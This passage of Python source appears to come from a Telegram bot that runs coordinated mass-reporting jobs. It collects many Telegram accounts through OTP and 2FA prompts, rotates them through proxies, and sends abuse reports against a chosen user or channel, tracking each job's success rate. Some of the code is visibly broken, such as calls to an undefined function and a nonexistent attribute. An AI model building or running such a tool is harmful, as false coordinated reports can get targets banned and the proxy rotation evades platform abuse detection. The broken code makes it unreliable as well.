            peer = raw_types.InputPeerUser(user_id=target_id, access_hash=0)  # fallback
        # For simplicity, we'll use the pyrogram's report method (if available) or raw invoke
        try:
            # Using raw function
            await client.invoke(
                functions.messages.Report(
                    peer=peer,
                    id=[],  # empty list reports the whole peer
                    reason=reason(),
                    message=job.description[:100]
                )
            )
        except AttributeError:
            # Fallback for older pyrogram
            await client.report_peer(peer, reason=reason)

    async def _complete_job(self, job: ReportJob):
        if job.status in [ReportStatus.COMPLETED, ReportStatus.FAILED, ReportStatus.PARTIAL]:
            self.job_history.append(job)
            if job.job_id in self.active_jobs:
                del self.active_jobs[job.job_id]
            self._save_jobs()
            await self._send_job_notification(job)

    async def _send_job_notification(self, job: ReportJob):
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            msg = f"📊 *Report Job {job.job_id}*\n\n"
            msg += f"**Target:** {job.target}\n"
            msg += f"**Category:** {job.category}\n"
            msg += f"**Status:** {job.status.name}\n"
            msg += f"**Accounts Used:** {job.performance_metrics['total_accounts']}\n"
            msg += f"**Successful:** {job.performance_metrics['successful_accounts']}\n"
            msg += f"**Failed:** {job.performance_metrics['failed_accounts']}\n"
            msg += f"**Success Rate:** {job.get_success_rate():.1f}%\n"
            if job.performance_metrics['total_duration']:
                msg += f"**Duration:** {job.performance_metrics['total_duration']:.1f}s\n"
            await app.bot.send_message(chat_id=job.created_by, text=msg, parse_mode='Markdown')
            await app.shutdown()
        except Exception as e:
            console.print(f"[red]❌ Failed to send job notification: {e}[/red]")

    async def get_job_status(self, job_id: str) -> Optional[Dict]:
        job = self.active_jobs.get(job_id)
        if not job:
            # search history
            for j in self.job_history:
                if j.job_id == job_id:
                    job = j
                    break
        if job:
            return {
                "job_id": job.job_id,
                "target": job.target,
                "status": job.status.name,
                "progress": f"{job.performance_metrics['successful_accounts']}/{job.performance_metrics['total_accounts']}",
                "success_rate": job.get_success_rate(),
                "created_at": job.created_at.isoformat(),
                "completed_at": job.completed_at.isoformat() if job.completed_at else None
            }
        return None

    def get_system_stats(self) -> Dict[str, Any]:
        return {
            "active_jobs": len(self.active_jobs),
            "completed_jobs": len(self.job_history),
            "queue_size": self.report_queue.qsize()
        }

    async def cleanup(self):
        console.print("[yellow]🧹 Cleaning up reporting engine...[/yellow]")
        self.is_running = False
        for _ in range(len(self.worker_tasks)):
            await self.report_queue.put(None)
        if self.worker_tasks:
            await asyncio.gather(*self.worker_tasks, return_exceptions=True)
        self._save_jobs()
        console.print("[green]✅ Reporting engine cleanup complete[/green]")

# ============================================
# ADVANCED BOT HANDLER – FULL IMPLEMENTATION
# ============================================
class AdvancedBotHandler:
    def __init__(self, user_manager: AdvancedUserManager,
                 account_manager: AdvancedAccountManager,
                 reporting_engine: AdvancedReportingEngine,
                 proxy_manager: AdvancedProxyManager,
                 otp_verification: AdvancedOTPVerification):

        self.user_manager = user_manager
        self.account_manager = account_manager
        self.reporting_engine = reporting_engine
        self.proxy_manager = proxy_manager
        self.otp_verification = otp_verification

        self.START, self.ADD_PHONE, self.ADD_OTP, self.ADD_PASSWORD = range(4)
        self.REPORT_TARGET, self.REPORT_CATEGORY, self.REPORT_SUBCATEGORY, self.REPORT_DESCRIPTION = range(4, 8)
        self.ADMIN_MENU, self.USER_MANAGEMENT, self.ACCOUNT_MANAGEMENT, self.SYSTEM_MANAGEMENT = range(8, 12)
        self.SETTINGS_MENU, self.STATS_DETAILED = range(12, 14)

        self.user_sessions = {}
        self.commands = [
            BotCommand("start", "Start the bot"),
            BotCommand("help", "Show help information"),
            BotCommand("report", "Start a new report"),
            BotCommand("stats", "Show statistics"),
            BotCommand("accounts", "Manage accounts (Admin)"),
            BotCommand("jobs", "View report jobs"),
            BotCommand("proxies", "View proxy status"),
            BotCommand("settings", "User settings"),
            BotCommand("admin", "Admin panel (Admin only)"),
        ]

    async def setup_bot_commands(self, application: Application):
        await application.bot.set_my_commands(
            commands=self.commands,
            scope=BotCommandScopeAllPrivateChats()
        )
        console.print("[green]✅ Bot commands setup complete[/green]")

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username
        first_name = update.effective_user.first_name
        last_name = update.effective_user.last_name

        self.user_manager.update_user_activity(user_id, username, first_name, last_name)

        welcome_text = (
            f"👋 *Welcome, {first_name or 'User'}!*\n\n"
            f"**Telegram Enterprise Reporting System v11.0**\n"
            f"Your role: `{self.user_manager.users[user_id].role.name if user_id in self.user_manager.users else 'USER'}`\n\n"
            f"Use /help to see available commands.\n"
            f"Use /report to start reporting."
        )
        keyboard = self._get_main_keyboard(self.user_manager.users.get(user_id, TelegramUser(user_id=user_id)).role)
        await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=keyboard)

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        role = self.user_manager.users.get(user_id, TelegramUser(user_id=user_id)).role

        help_text = "*📘 Available Commands*\n\n"
        help_text += "*/start* - Restart the bot\n"
        help_text += "*/help* - Show this message\n"
        help_text += "*/stats* - View system statistics\n"
        help_text += "*/report* - Create a new report\n"
        help_text += "*/jobs* - View your report jobs\n"

        if role >= UserRole.REPORTER:
            help_text += "*/accounts* - Manage Telegram accounts\n"
        if role >= UserRole.MODERATOR:
            help_text += "*/proxies* - View proxy status\n"
        if role >= UserRole.ADMIN:
            help_text += "*/admin* - Admin control panel\n"
        help_text += "*/settings* - Personal settings\n"

        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.user_manager.check_permission(user_id, "view_stats"):
            await update.message.reply_text("❌ You do not have permission to view statistics.")
            return

        user_stats = self.user_manager.get_user_stats(user_id)
        system_stats = self.user_manager.get_system_stats()
        account_stats = self.account_manager.get_account_stats()
        proxy_stats = self.proxy_manager.get_detailed_stats()
        reporting_stats = self.reporting_engine.get_system_stats()

        msg = "*📊 System Statistics*\n\n"
        msg += f"*Users:* {system_stats['total_users']} total, {system_stats['active_users']} active\n"
        msg += f"*Accounts:* {account_stats['total']} total, {account_stats['active']} active\n"
        msg += f"*Proxies:* {proxy_stats['working_proxies']} working / {proxy_stats['total_tested']} total\n"
        msg += f"*Jobs:* {reporting_stats['active_jobs']} active, {reporting_stats['completed_jobs']} completed\n"
        msg += f"*Your Reports:* {user_stats['reports_made']}\n"
        if user_stats['statistics']['report_success_rate'] is not None:
            msg += f"*Your Success Rate:* {user_stats['statistics']['report_success_rate']:.1f}%\n"

        await update.message.reply_text(msg, parse_mode='Markdown')

    async def report_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.user_manager.check_permission(user_id, "create_report"):
            await update.message.reply_text("❌ You do not have permission to create reports.")
            return

        context.user_data['report_step'] = self.REPORT_TARGET
        await update.message.reply_text(
            "📝 *Start New Report*\n\n"
            "Please send the **username**, **user ID**, or **channel link** you want to report.\n\n"
            "Example: `@spammer` or `123456789` or `https://t.me/spam_channel`",
            parse_mode='Markdown'
        )
        return self.REPORT_TARGET

    async def handle_report_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        target = update.message.text.strip()
        context.user_data['report_target'] = target
        context.user_data['report_step'] = self.REPORT_CATEGORY

        keyboard = []
        for cat_id, cat_info in self.reporting_engine.categories.items():
            keyboard.append([InlineKeyboardButton(cat_info['name'], callback_data=f"cat_{cat_id}")])
        keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel")])

        await update.message.reply_text(
            "📂 *Select Report Category*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return self.REPORT_CATEGORY

    async def handle_report_category(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data

        if data == "cancel":
            await query.edit_message_text("❌ Report cancelled.")
            return ConversationHandler.END

        if data.startswith("cat_"):
            category = data[4:]
            context.user_data['report_category'] = category
            context.user_data['report_step'] = self.REPORT_SUBCATEGORY

            keyboard = []
            subcats = self.reporting_engine.categories.get(category, {}).get('subcategories', {})
            for sub_id, sub_info in subcats.items():
                keyboard.append([InlineKeyboardButton(sub_info['name'], callback_data=f"sub_{category}_{sub_id}")])
            keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
            keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel")])

            await query.edit_message_text(
                f"📌 *Category: {self.reporting_engine.categories[category]['name']}*\n\nPlease select a subcategory:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return self.REPORT_SUBCATEGORY

    async def handle_report_subcategory(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data

        if data == "cancel":
            await query.edit_message_text("❌ Report cancelled.")
            return ConversationHandler.END
        if data == "back":
            context.user_data['report_step'] = self.REPORT_CATEGORY
            keyboard = []
            for cat_id, cat_info in self.reporting_engine.categories.items():
                keyboard.append([InlineKeyboardButton(cat_info['name'], callback_data=f"cat_{cat_id}")])
            keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel")])
            await query.edit_message_text(
                "📂 *Select Report Category*",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return self.REPORT_CATEGORY

        if data.startswith("sub_"):
            parts = data.split('_')
            category = parts[1]
            sub_id = int(parts[2])
            context.user_data['report_subcategory'] = str(sub_id)
            context.user_data['report_step'] = self.REPORT_DESCRIPTION

            await query.edit_message_text(
                "✏️ *Report Description*\n\n"
                "Please provide a brief description of the violation.\n"
                "This will be sent along with the report.\n\n"
                "Send /cancel to abort.",
                parse_mode='Markdown'
            )
            return self.REPORT_DESCRIPTION

    async def handle_report_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        description = update.message.text
        if len(description) > 200:
            description = description[:200]

        target = context.user_data.get('report_target')
        category = context.user_data.get('report_category')
        subcategory = context.user_data.get('report_subcategory')
        user_id = update.effective_user.id

        # Determine target type
        target_type = "user"
        if target.startswith('https://t.me/') or target.startswith('@'):
            target_type = "channel"
        elif target.isdigit():
            target_type = "user"

        job_id = await self.reporting_engine.create_job(
            target=target,
            target_type=target_type,
            category=category,
            subcategory=subcategory,
            description=description,
            created_by=user_id
        )

        await update.message.reply_text(
            f"✅ *Report Job Created*\n\n"
            f"**Job ID:** `{job_id}`\n"
            f"**Target:** {target}\n"
            f"**Category:** {category}\n\n"
            f"Your report has been queued. You will receive a notification when it completes.\n"
            f"Use /jobs to check status.",
            parse_mode='Markdown'
        )

        await self.reporting_engine.start_job(job_id)
        self.user_manager.increment_reports(user_id)
        return ConversationHandler.END

    async def accounts_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.user_manager.check_permission(user_id, "add_account"):
            await update.message.reply_text("❌ You do not have permission to manage accounts.")
            return

        keyboard = [
            [InlineKeyboardButton("➕ Add Account", callback_data="account_add")],
            [InlineKeyboardButton("📋 List Accounts", callback_data="account_list")],
            [InlineKeyboardButton("🔄 Rotate Proxies", callback_data="account_rotate_all")],
            [InlineKeyboardButton("🧹 Cleanup", callback_data="account_cleanup")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_back")]
        ]
        await update.message.reply_text(
            "*Account Management*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def proxies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.user_manager.check_permission(user_id, "manage_system"):
            await update.message.reply_text("❌ You do not have permission to view proxies.")
            return

        stats = self.proxy_manager.get_detailed_stats()
        msg = "*🌐 Proxy Status*\n\n"
        msg += f"**Total Proxies:** {stats['total_tested']}\n"
        msg += f"**Working:** {stats['working_proxies']}\n"
        msg += f"**Failed:** {stats['failed_proxies']}\n"
        msg += f"**Active:** {len(self.proxy_manager.active_proxies)}\n"
        msg += f"**Fast:** {len(self.proxy_manager.fast_proxies)}\n"
        msg += f"**Premium:** {len(self.proxy_manager.premium_proxies)}\n"
        msg += f"**Avg Speed:** {stats['avg_speed']:.2f}ms\n"
        msg += f"**Last Update:** {stats['last_update']}\n"

        await update.message.reply_text(msg, parse_mode='Markdown')

    async def jobs_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        user_jobs = []
        for job in self.reporting_engine.active_jobs.values():
            if job.created_by == user_id:
                user_jobs.append(job)
        for job in self.reporting_engine.job_history[-10:]:
            if job.created_by == user_id:
                user_jobs.append(job)

        if not user_jobs:
            await update.message.reply_text("You have no recent report jobs.")
            return

        msg = "*📋 Your Recent Jobs*\n\n"
        for job in user_jobs[-5:]:
            msg += f"`{job.job_id}`: {job.target} – *{job.status.name}*"
            if job.completed_at:
                msg += f" ({job.get_success_rate():.0f}%)\n"
            else:
                msg += "\n"
        await update.message.reply_text(msg, parse_mode='Markdown')

    async def admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.user_manager.check_permission(user_id, "manage_system"):
            await update.message.reply_text("❌ You do not have permission to access the admin panel.")
            return

        keyboard = [
            [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
            [InlineKeyboardButton("📊 System Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")],
            [InlineKeyboardButton("🔄 Restart Proxies", callback_data="admin_restart_proxies")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_back")]
        ]
        await update.message.reply_text(
            "*🔧 Admin Control Panel*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def settings_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        user = self.user_manager.users.get(user_id)
        if not user:
            user = TelegramUser(user_id=user_id)
            self.user_manager.users[user_id] = user

        settings = user.settings
        msg = "*⚙️ Your Settings*\n\n"
        msg += f"**Notifications:** {'✅' if settings.get('notifications') else '❌'}\n"
        msg += f"**Auto-start:** {'✅' if settings.get('auto_start') else '❌'}\n"
        msg += f"**Proxy Priority:** `{settings.get('proxy_priority', 'speed')}`\n"
        msg += f"**Report Limit:** `{settings.get('report_limit', 10)}`\n"
        msg += f"**Language:** `{settings.get('language', 'en')}`\n"
        msg += f"**Timezone:** `{settings.get('timezone', 'UTC')}`\n\n"

        keyboard = [
            [InlineKeyboardButton("🔔 Toggle Notifications", callback_data="settings_toggle_notify")],
            [InlineKeyboardButton("🚀 Toggle Auto-start", callback_data="settings_toggle_autostart")],
            [InlineKeyboardButton("🌐 Change Language", callback_data="settings_language")],
            [InlineKeyboardButton("📊 Set Report Limit", callback_data="settings_report_limit")],
            [InlineKeyboardButton("🔙 Back", callback_data="settings_back")]
        ]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

    async def handle_callback_query(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        user_id = update.effective_user.id

        if data.startswith("otp_enter_"):
            session_id = data[10:]
            context.user_data['otp_session_id'] = session_id
            await query.edit_message_text(
                "🔐 *Enter OTP Code*\n\n"
                "Please type the 5-digit code you received:",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_otp'] = True
            return

        elif data.startswith("otp_resend_"):
            session_id = data[11:]
            success, msg = await self.otp_verification.resend_otp(session_id, update, user_id)
            await query.edit_message_text(
                f"{'✅' if success else '❌'} *Resend OTP*\n\n{msg}",
                parse_mode='Markdown'
            )
            return

        elif data == "otp_cancel":
            await query.edit_message_text("❌ Verification cancelled.")
            return

        elif data.startswith("2fa_"):
            session_id = data[4:]
            context.user_data['2fa_session_id'] = session_id
            await query.edit_message_text(
                "🔐 *2FA Password Required*\n\n"
                "Please enter your account's 2FA password:",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_2fa'] = True
            return

        # Admin / Account callbacks
        elif data == "account_add":
            await query.edit_message_text(
                "➕ *Add Account*\n\n"
                "Please send the phone number in international format:\n"
                "Example: `+1234567890`",
                parse_mode='Markdown'
            )
            context.user_data['adding_account'] = True

        elif data == "account_list":
            stats = self.account_manager.get_account_stats()
            msg = "*📋 Account List*\n\n"
            msg += f"**Total:** {stats['total']}\n"
            msg += f"**Active:** {stats['active']}\n"
            msg += f"**Verifying:** {stats['verifying']}\n"
            msg += f"**Need Password:** {stats['need_password']}\n"
            msg += f"**Flood Wait:** {stats['flood_wait']}\n"
            msg += f"**Premium:** {stats['premium']}\n\n"
            msg += "*Top 10 Active:*\n"
            accounts = await self.account_manager.get_available_accounts(limit=10)
            for acc in accounts:
                msg += f"`{acc.phone}` – @{acc.username or '?'} – {acc.get_health_score():.0f}%\n"
            await query.edit_message_text(msg, parse_mode='Markdown')

        elif data == "account_rotate_all":
            await query.edit_message_text("🔄 Rotating proxies for all active accounts...")
            count = 0
            for acc in self.account_manager.accounts.values():
                if acc.status == AccountStatus.ACTIVE and await self.account_manager.rotate_proxy_for_account(acc):
                    count += 1
            await query.edit_message_text(f"✅ Rotated proxies for {count} accounts.")

        elif data == "account_cleanup":
            await query.edit_message_text("🧹 Cleaning up account manager...")
            await self.account_manager.perform_account_maintenance()
            await query.edit_message_text("✅ Account maintenance complete.")

        elif data == "admin_users":
            stats = self.user_manager.get_system_stats()
            msg = "*👥 User Management*\n\n"
            msg += f"**Total Users:** {stats['total_users']}\n"
            msg += f"**Active:** {stats['active_users']}\n"
            msg += f"**Banned:** {stats['banned_users']}\n"
            msg += f"**Admins:** {stats['admin_count']}\n\n"
            keyboard = [
                [InlineKeyboardButton("➕ Add User", callback_data="user_add")],
                [InlineKeyboardButton("🔨 Ban User", callback_data="user_ban")],
                [InlineKeyboardButton("⬆️ Promote", callback_data="user_promote")],
                [InlineKeyboardButton("⬇️ Demote", callback_data="user_demote")],
                [InlineKeyboardButton("🔙 Back", callback_data="admin_back")]
            ]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

        elif data == "admin_stats":
            await stats_command(self, update, context)  # reuse stats command

        elif data == "admin_settings":
            await query.edit_message_text("⚙️ System settings (not implemented)")

        elif data == "admin_restart_proxies":
            await query.edit_message_text("🔄 Restarting proxy verification...")
            asyncio.create_task(self.proxy_manager.verify_all_proxies_parallel())
            await query.edit_message_text("✅ Proxy verification started in background.")

        elif data == "admin_back":
            await query.edit_message_text("🔙 Returned to main menu.")
            # could show start again

        elif data.startswith("settings_"):
            await self._handle_settings_action(query, data)

        else:
            await query.edit_message_text("Unknown action.")

    async def _handle_settings_action(self, query, action: str):
        user_id = query.from_user.id
        user = self.user_manager.users.get(user_id)
        if not user:
            user = TelegramUser(user_id=user_id)
            self.user_manager.users[user_id] = user

        if action == "settings_toggle_notify":
            user.settings['notifications'] = not user.settings.get('notifications', True)
            self.user_manager._save_users()
            await query.edit_message_text(f"🔔 Notifications {'enabled' if user.settings['notifications'] else 'disabled'}.")
        elif action == "settings_toggle_autostart":
            user.settings['auto_start'] = not user.settings.get('auto_start', False)
            self.user_manager._save_users()
            await query.edit_message_text(f"🚀 Auto-start {'enabled' if user.settings['auto_start'] else 'disabled'}.")
        elif action == "settings_language":
            # Simple toggle between en/es
            user.settings['language'] = 'es' if user.settings.get('language') == 'en' else 'en'
            self.user_manager._save_users()
            await query.edit_message_text(f"🌐 Language set to {user.settings['language']}.")
        elif action == "settings_report_limit":
            await query.edit_message_text("📊 Please enter a new report limit (1-100):")
            query._user_data['awaiting_report_limit'] = True
        elif action == "settings_back":
            await query.edit_message_text("🔙 Settings closed.")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text

        # OTP input
        if context.user_data.get('awaiting_otp'):
            session_id = context.user_data.get('otp_session_id')
            if not session_id:
                await update.message.reply_text("❌ OTP session expired.")
                context.user_data['awaiting_otp'] = False
                return
            otp_code = text.strip()
            success, msg = await self.otp_verification.verify_otp_code(session_id, otp_code, update, user_id)
            if success:
                await update.message.reply_text("✅ " + msg)
                context.user_data['awaiting_otp'] = False
            else:
                if msg == "2FA_PASSWORD":
                    # Ask for 2FA
                    session = self.otp_verification.otp_sessions.get(session_id)
                    if session:
                        keyboard = InlineKeyboardMarkup([
                            [InlineKeyboardButton("🔐 Enter Password", callback_data=f"2fa_{session_id}")],
                            [InlineKeyboardButton("❌ Cancel", callback_data="otp_cancel")]
                        ])
                        await update.message.reply_text(
                            "🔐 *2FA Required*\n\nThis account has two‑factor authentication enabled.\nPlease enter your password.",
                            parse_mode='Markdown',
                            reply_markup=keyboard
                        )
                        context.user_data['awaiting_otp'] = False
                    else:
                        await update.message.reply_text("❌ Session expired.")
                else:
                    await update.message.reply_text("❌ " + msg)
            return

        if context.user_data.get('awaiting_2fa'):
            session_id = context.user_data.get('2fa_session_id')
            password = text.strip()
            success, msg = await self.otp_verification.handle_2fa_password(session_id, password, update, user_id)
            await update.message.reply_text("✅ " + msg if success else "❌ " + msg)
            context.user_data['awaiting_2fa'] = False
            return

        # Adding account
        if context.user_data.get('adding_account'):
            phone = text.strip()
            if not phone.startswith('+'):
                phone = '+' + phone
            success, msg, account = await self.account_manager.add_account(phone)
            if success and account and msg == "OTP required":
                # Start OTP verification
                otp_session = self.otp_verification.otp_sessions.get(phone)
                if not otp_session:
                    # create new session
                    await self.otp_verification.start_otp_verification(
                        phone, account.client, update, user_id
                    )
                else:
                    # reuse existing session
                    await self.otp_verification._send_otp_notification(update, phone, "SMS", otp_session)
                context.user_data['adding_account'] = False
            elif success and account and msg == "Account already authorized":
                await update.message.reply_text(f"✅ Account {phone} is already authorized and ready to use.")
                context.user_data['adding_account'] = False
            else:
                await update.message.reply_text(f"❌ Failed to add account: {msg}")
                context.user_data['adding_account'] = False
            return

        # Settings report limit
        if context.user_data.get('awaiting_report_limit'):
            try:
                limit = int(text.strip())
                if 1 <= limit <= 100:
                    user = self.user_manager.users[user_id]
                    user.settings['report_limit'] = limit
                    self.user_manager._save_users()
                    await update.message.reply_text(f"✅ Report limit set to {limit}.")
                else:
                    await update.message.reply_text("❌ Please enter a number between 1 and 100.")
            except ValueError:
                await update.message.reply_text("❌ Invalid number.")
            context.user_data['awaiting_report_limit'] = False
            return

        # Default response
        await update.message.reply_text(
            "I didn't understand that command. Use /help to see available commands."
        )

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        console.print(f"[red]❌ Error occurred: {context.error}[/red]")
        try:
            if update and update.effective_message:
                await update.effective_message.reply_text(
                    "❌ An internal error occurred. Please try again later."
                )
        except:
            pass

    def _get_main_keyboard(self, role: UserRole) -> Optional[ReplyKeyboardMarkup]:
        buttons = []
        if role >= UserRole.USER:
            buttons.append([KeyboardButton("/report"), KeyboardButton("/stats")])
            buttons.append([KeyboardButton("/jobs"), KeyboardButton("/settings")])
        if role >= UserRole.REPORTER:
            buttons.append([KeyboardButton("/accounts")])
        if role >= UserRole.ADMIN:
            buttons.append([KeyboardButton("/admin"), KeyboardButton("/proxies")])
        if role == UserRole.BANNED:
            return ReplyKeyboardMarkup([], resize_keyboard=True)
        return ReplyKeyboardMarkup(buttons, resize_keyboard=True) if buttons else None

# ============================================
# MAIN APPLICATION
# ============================================
class TelegramEnterpriseBot:
    def __init__(self):
        console.print("[cyan]🚀 Initializing Telegram Enterprise Bot v11.0 (Pyrogram Edition) – Full Fixed[/cyan]")
        setattr(Update, '_user_sessions', {})
        self.user_manager = AdvancedUserManager()
        self.proxy_manager = AdvancedProxyManager()
        self.otp_verification = AdvancedOTPVerification(None, self.proxy_manager)
        self.account_manager = AdvancedAccountManager(
            self.proxy_manager,
            self.user_manager,
            self.otp_verification
        )
        self.otp_verification.account_manager = self.account_manager
        self.reporting_engine = AdvancedReportingEngine(
            self.account_manager,
            self.proxy_manager,
            self.user_manager
        )
        self.bot_handler = AdvancedBotHandler(
            self.user_manager,
            self.account_manager,
            self.reporting_engine,
            self.proxy_manager,
            self.otp_verification
        )
        persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
        self.application = (
            ApplicationBuilder()
            .token(BOT_TOKEN)
            .persistence(persistence)
            .post_init(self.bot_handler.setup_bot_commands)
            .build()
        )
        self._setup_handlers()
        self._print_system_banner()

    def _setup_handlers(self):
        console.print("[cyan]🔧 Setting up bot handlers...[/cyan]")
        self.application.add_handler(CommandHandler("start", self.bot_handler.start_command))
        self.application.add_handler(CommandHandler("help", self.bot_handler.help_command))
        self.application.add_handler(CommandHandler("stats", self.bot_handler.stats_command))
        self.application.add_handler(CommandHandler("accounts", self.bot_handler.accounts_command))
        self.application.add_handler(CommandHandler("proxies", self.bot_handler.proxies_command))
        self.application.add_handler(CommandHandler("jobs", self.bot_handler.jobs_command))
        self.application.add_handler(CommandHandler("admin", self.bot_handler.admin_command))
        self.application.add_handler(CommandHandler("settings", self.bot_handler.settings_command))

        # Report conversation
        report_handler = ConversationHandler(
            entry_points=[CommandHandler("report", self.bot_handler.report_command)],
            states={
                self.bot_handler.REPORT_TARGET: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND,
                                 self.bot_handler.handle_report_target)
                ],
                self.bot_handler.REPORT_CATEGORY: [
                    CallbackQueryHandler(self.bot_handler.handle_report_category,
                                       pattern="^cat_|^cancel$")
                ],
                self.bot_handler.REPORT_SUBCATEGORY: [
                    CallbackQueryHandler(self.bot_handler.handle_report_subcategory,
                                       pattern="^sub_|^back|^cancel$")
                ],
                self.bot_handler.REPORT_DESCRIPTION: [
                    MessageHandler(filters.TEXT & ~filters.COMMAND,
                                 self.bot_handler.handle_report_description)
                ]
            },
            fallbacks=[CommandHandler("cancel", self.bot_handler.start_command)],
            allow_reentry=True,
            name="report_conversation"
        )
        self.application.add_handler(report_handler)

        # Callback query handler
        self.application.add_handler(
            CallbackQueryHandler(self.bot_handler.handle_callback_query)
        )
        # General message handler
        self.application.add_handler(
            MessageHandler(filters.TEXT & ~filters.COMMAND,
                         self.bot_handler.handle_message)
        )
        # Error handler
        self.application.add_error_handler(self.bot_handler.error_handler)
        console.print("[green]✅ Bot handlers setup complete[/green]")

    async def initialize_system(self) -> bool:
        console.print("[yellow]🔧 Initializing enterprise system components...[/yellow]")
        try:
            console.print("[cyan]1. Initializing Proxy Manager...[/cyan]")
            proxy_ok = await self.proxy_manager.initialize()
            if not proxy_ok:
                console.print("[red]❌ Proxy manager initialization failed[/red]")
                console.print("[yellow]⚠️ Continuing without proxy verification...[/yellow]")
            console.print("[cyan]2. Running system self-check...[/cyan]")
            await self._run_system_self_check()
            console.print("[cyan]3. Loading system data...[/cyan]")
            await self._load_system_data()
            console.print("[cyan]4. Starting background tasks...[/cyan]")
            await self._start_background_tasks()
            console.print("[green]✅ Enterprise system initialization complete[/green]")
            return True
        except Exception as e:
            console.print(f"[red]❌ System initialization failed: {e}[/red]")
            import traceback
            traceback.print_exc()
            return False

    async def _run_system_self_check(self):
        console.print("[cyan]🔍 Running self-check...[/cyan]")
        # Check directories
        for d in [DATA_DIR, SESSION_DIR, LOG_DIR, BACKUP_DIR, ANALYTICS_DIR]:
            d.mkdir(exist_ok=True)
        # Check bot token
        if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
            console.print("[red]❌ BOT_TOKEN is not set![/red]")
        # Check API credentials
        if not API_ID or not API_HASH:
            console.print("[red]❌ API_ID or API_HASH not set![/red]")
        console.print("[green]✅ Self-check passed[/green]")

    async def _load_system_data(self):
        # Already loaded via constructors
        pass

    async def _start_background_tasks(self):
        async def periodic_maintenance():
            while True:
                try:
                    await asyncio.sleep(3600)
                    console.print("[cyan]🔄 Running periodic maintenance...[/cyan]")
                    self.user_manager.cleanup_inactive_sessions()
                    await self.account_manager._check_account_health()
                    self.otp_verification.cleanup_expired_sessions()
                    self.user_manager._save_users()
                    self.account_manager._save_accounts()
                    self.reporting_engine._save_jobs()
                    await self.proxy_manager.save_cache()
                    console.print("[green]✅ Periodic maintenance complete[/green]")
                except Exception as e:
                    console.print(f"[red]❌ Maintenance error: {e}[/red]")
                    await asyncio.sleep(300)
        asyncio.create_task(periodic_maintenance())
        console.print("[green]✅ Background tasks started[/green]")

    async def run(self):
        initialized = await self.initialize_system()
        if not initialized:
            console.print("[red]❌ System initialization failed. Cannot start bot.[/red]")
            console.print("[yellow]💡 Check the error messages above and fix the issues.[/yellow]")
            return
        console.print("[green]🤖 Starting Telegram Enterprise Bot...[/green]")
        try:
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            console.print("[green]✅ Bot is running![/green]")
            console.print("[yellow]📱 Use /start in Telegram to begin[/yellow]")
            console.print("[cyan]⚡ System is fully operational with all features enabled[/cyan]")
            await self._display_system_status()
            try:
                while True:
                    await asyncio.sleep(1)
            except KeyboardInterrupt:
                console.print("\n[yellow]⚠️ Received shutdown signal...[/yellow]")
            finally:
                await self.shutdown()
        except Exception as e:
            console.print(f"[red]❌ Bot startup failed: {e}[/red]")
            import traceback
            traceback.print_exc()
            await self.shutdown()

    async def _display_system_status(self):
        table = Table(title="System Status", box=box.ROUNDED)
        table.add_column("Component", style="cyan")
        table.add_column("Status", style="green")
        table.add_column("Details", style="yellow")
        table.add_row("User Manager", "✅", f"{len(self.user_manager.users)} users")
        table.add_row("Proxy Manager", "✅" if self.proxy_manager.active_proxies else "⚠️", f"{len(self.proxy_manager.active_proxies)} active")
        table.add_row("Account Manager", "✅", f"{len(self.account_manager.accounts)} total, {self.account_manager.get_account_stats()['active']} active")
        table.add_row("Reporting Engine", "✅", f"{len(self.reporting_engine.active_jobs)} active jobs")
        console.print(table)

    async def shutdown(self):
